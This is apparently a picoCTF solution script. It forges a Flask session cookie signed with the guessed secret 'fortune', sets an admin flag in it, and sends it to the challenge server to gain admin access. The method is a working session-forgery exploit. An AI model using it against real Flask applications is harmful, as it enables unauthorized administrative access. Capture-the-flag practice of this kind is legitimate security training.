from itsdangerous import URLSafeTimedSerializer
from flask import Flask
from flask.sessions import SecureCookieSessionInterface
import requests

def generate_session_cookie(secret_key, data):
    app = Flask(__name__)  
    app.secret_key = secret_key  

    session_interface = SecureCookieSessionInterface()
    serializer = session_interface.get_signing_serializer(app)  
    return serializer.dumps(data)  # Correct way to generate signed session cookies


secret_key="fortune"
session_data = {'very_auth': 'admin'}
session_cookie = generate_session_cookie(secret_key, session_data)
print(f"[+] Generated Admin Session Cookie: {session_cookie}")



url = "http://mercury.picoctf.net:18835/display"
# Generate the session cookie
cookies = {'session': session_cookie}
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
}

response = requests.get(url, cookies=cookies, headers=headers)
print(response.text)  # Print response content

